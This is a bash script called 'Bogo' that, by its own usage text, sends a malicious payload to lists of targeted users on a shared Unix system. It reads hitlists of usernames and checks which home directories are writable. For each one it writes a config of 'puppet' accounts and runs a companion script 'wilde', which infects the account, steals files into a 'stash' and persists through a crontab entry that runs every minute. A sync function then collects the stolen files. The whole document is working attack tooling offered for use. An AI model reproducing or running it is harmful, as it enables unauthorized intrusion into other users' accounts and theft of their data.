#!/bin/bash
# Bogo

header="BOGO v1.2\nProperty of Michael Talon\n"

# Make sure these are hardcoded to YOUR home directory
# If you run this as root, it will treat ~ as /root

base=/home/penchant81718/zpd  # Bogo's working directory
puppets=$base/puppets.bogo    # Location of the puppets list
target_list=$base/targets.d   # Location of target files
wilde=$base/wilde             # Location of wilde

onfail=continue               # Set to 'retry' if you want bogo to
                              # continuously hit target if it is locked
                              
retry_delay=5                 # Seconds to wait before attempting to
                              # breach target again if configured to
                              # retry on fail. 
                              # Set this between 1 and 30 seconds,
                              # Default is 5.

VarCheck(){
	# Make sure our constants actually exist
	if [[ ! -e $1 ]]; then
		echo "My constants are not set correctly..."
		Error fatal "$1 does not exist"
	fi
}

PuppetInit(){
	if [[ ! -e $puppets ]]; then
		echo "No puppet file was given - using default"
		puppets=$base/stash
		if [[ ! -e $puppets ]]; then
			echo "Creating $puppets"
			mkdir $puppets
		fi
	fi
	VarCheck $puppets
}

NameTargets(){
	# Parse the filename for the target files, and extract usernames
	# from them
	if [[ -e $base/_bogo.tmp ]]; then
		rm $base/_bogo.tmp
		touch $base/_bogo.tmp
	fi
	local i=0
	local m=0
	local j=0
	local c=0
	potarg=$(ls $target_list)
	for m in $potarg; do
		l=${m%_*}
		j=${m##*_}
		k=${j#*.}
		o=${j%.*o}
		if [[ $l = "targets" ]] && [[ $k == "bogo" ]]; then
			PathCheck $target_list/$m
			cat $target_list/$m >> $base/_bogo.tmp
		fi
	done
	ReadFile $base/_bogo.tmp
}

PathCheck(){
	# Check if a path exists and we can actually read it
	if [[ ! -e $1 ]]; then
		Error fatal "Can't find $1"
	elif [[ ! -r $1 ]]; then
		Error fatal "Denied read access to $1"
	else
		echo "Found $1"
	fi
}

Error(){
	# Prints an error message, terminate if fatal
	case "$1" in
		"warn") echo "WARNING: $2";;
		"fatal") echo "FATAL: $2"
			 echo -ne "\nABORTING\n"
			 exit 1;;
		"note") echo "NOTE: $2";;
		*) echo -ne "\nBUG: Errorception \n1: $1 \n2: $2\n"
		   exit 69;;
	esac
}

ArrayHasValue(){
	local i thing="$1"
	shift
	for i; do 
		[[ "$i" == "$thing" ]] && return 0; 
	done
	return 1
}

ReadFile(){
	# Confirms our puppets and targets are accessable
	while IFS='' read -r line || [[ -n "$line" ]]; do
		if [[ $1 == $puppets ]]; then
			CheckPuppet $line
		else
			ArrayHasValue "$line" "${targets_go[@]}"
			if [[ $? == 0 ]]; then
				if [[ -z $z ]]; then
					echo "Ignoring duplicates in hitlist... dammit hopps"
					z=1
				fi
			else
				if [[ -d /home/$line ]]; then
					targets_go[$i]=$line
					((i++))
				fi
			fi
		fi
	done < "$1"
}

CheckPuppet(){
	# Can we write to our puppet?
	if [[ -w $1 ]]; then
			echo "Puppet $1 is UP"
		puppets_go[$n]=$1
		((n++))
	else
			echo "Puppet $1 is DOWN"
	fi
}

CountWilde(){
	present=0
	active=0
	if [[ "$(id -u)" != "0" ]]; then
		Error note "Must have root privledges to find wilde"
	else
		for file in $1/*; do
			if [[ -e $file/._/.wilde ]]; then
				((present++))
				if [[ $(crontab -u ${file##$scope/} -l) == *"* * * * ~/._/.wilde"* ]]; then
					((active++))
				fi
			fi
		done
	fi
}

WildeSanityCheck(){
	# Checks if wilde will actually execute AND TERMINATE properly
	# Until finished, just cross your fingers that wilde doesnt loop
	# endlessly
	#$wilde dl $base/wilde.cfg
	return 0
}

Usage(){
	echo "
		
	bogo [Action]
	
	This script is designed to send a malicious payload to targeted
	users - EXECUTE AT YOUR OWN RISK.
	
	Before executing you should modify the \"base\" variable to match
	your home directory, so that bogo knows where to put things.
	
	Make sure it is hard coded (ie not using ~) to the desired directory.
	If ran as root, ~ will be treated as /root, which probably isnt what
	you want.
	
	Bogo needs 2 things to operate:
		wilde	        The script that performs the attack
		
		targets.d	Directory that contains text files containing
				users whom Bogo should infect.
											
				These files must be in the form of
				\"targets_YourNameHere.bogo\" or they will
				be ignored.
	
	Bogo stores wilde's \"stash\" (the files he steals from user accounts)
	into his working directory in a folder called \"stash\".
	If you want to change this, create a file called \"puppets.bogo\"
	containing the new paths.
	
	List of actions:
	
	sync-puppets
	If puppets are specified in puppets.bogo, sync-puppets moves their
	contents to Bogo's working directory in a folder called \"stash\".
	
	hit
	Bogo attempts to access the users specified in the hitlist(s)
	in targets.d
	
	If he can't write to it, depending on how he is configured he will 
	either skip them, or wait a specified amount of time before trying 
	again.
	
	If he can write to them, the infection process begins.
	Bogo creates wilde's \"one time pad\": a configuration file containing
	a list of puppets to send the stash to.
	
	Wilde uses this to tailor the payload to the victim without revealing 
	the identities of the attacker or his puppets.
	
	Bogo then checks if wilde exists, contains no syntax errors, and his
	configuration points to valid directories. If these are all true,
	wilde is \"sane\", and ready for execution.
	
	Bogo executes wilde, and then waits for some kind of exit code.
	If wilde returns 0, he was successful and Bogo moves to the next
	target. Otherwise, Bogo will abort the operation.
	
	"
}

SyncPuppets(){
	# Moves wilde's stash from the puppet accounts into Bogo's working 
	# directory
	PathCheck $puppets
	ReadFile $puppets
	if [ ${#puppets_go[@]} -eq 0 ]; then
		Error warn "There are not puppets to sync!"
	else
		echo "Synchronizing stash..."
		for j in "${puppets_go[@]}"; do
			if [[ $j == "$base/stash" ]]; then
				echo "Skipping $j: thats our destination!"
			elif [[ ! -e $j ]]; then
				echo "Skipping $j: doesn't seem to exist"
			else
				mv -fv $j $base/stash
			fi
		done
		echo -ne "\nDone\n"
	fi
	
}

Hit(){
	# Where the fun begins
	local numyay=0
	local numboo=0
	NameTargets
	if [ ${#targets_go[@]} -eq 0 ]; then
		Error fatal "I dont have any targets!"
	fi
	PathCheck $puppets
	PathCheck $wilde
	ReadFile $puppets
	rm -f $base/_bogo.tmp
	echo -ne "\nReady to hit ${#targets_go[@]} target(s)\n"
	echo -ne "Press enter to continue - or Control+C to abort"
	read a1
	for k in "${targets_go[@]}"; do
		if [[ ! -w /home/$k ]]; then
			if [[ $onfail == "retry" ]]; then
				while [[ ! -w /home/$k ]]; do
					echo "$(date +%I-%M-%S): $k is locked - retrying in $retry_delay seconds"
					if [[ ! $retry_delay =~ ^-?[0-9]+$ ]]; then
						echo -ne "\n...$retry_delay is not a number *facepalm*\nRetrying in 5 seconds\n"
						retry_delay=5
					fi
					sleep $retry_delay
				done
			else
				echo "$k is locked, moving on"
			fi
		else
			echo -ne "\n------------- ATTEMPTING TO BREACH $k ------------- \n"
			touch $base/wilde.cfg
			echo "pl=(${puppets_go[@]})" >> $base/wilde.cfg
			echo "tl=$k" >> $base/wilde.cfg
			echo "el=$base" >> $base/wilde.cfg
			echo "Generated wilde's OTP"
			$wilde st $base/wilde.cfg
			if [[ $? == 0 ]]; then
				echo "Wilde is sane"
			else
				Error fatal "Wilde failed sanity check (code $?)"
			fi
			echo -ne "\nInfiltrating target - waiting for response...\n"
			$wilde dt $base/wilde.cfg
			if [[ $? == 0 ]]; then
				echo "Wilde reported success!"
				((numyay++))
				echo "--------------------------------------------------------------"
			else
				Error warn "Wilde's execution failed (code $?)"
				((numboo++))
				echo "--------------------------------------------------------------"
			fi
			rm $base/wilde.cfg
		fi
	done
	
	echo -ne "\nSuccessfully infiltrated $numyay target(s)\n"
}

clear
VarCheck $base
PuppetInit
VarCheck $target_list
VarCheck $wilde
if [[ $onfail == "retry" ]]; then
		if [ "$retry_delay" -lt 1 ] || [ "$retry_delay" -gt 30 ]; then
			Error note "Setting retry_delay to 5. Current setting is invalid"
			retry_delay=5
		fi
fi

echo -ne "$header\n"
if [[ ! -e $base ]]; then
	echo "Creating $base"
	mkdir $base
fi

if [[ -e $base/wilde.cfg ]]; then
	rm -f $base/wilde.cfg
	echo "Deleted butchered wilde.cfg"
fi

case $1 in
	sync-puppets) SyncPuppets;;
	hit) Hit;;
	*) Usage;;
esac
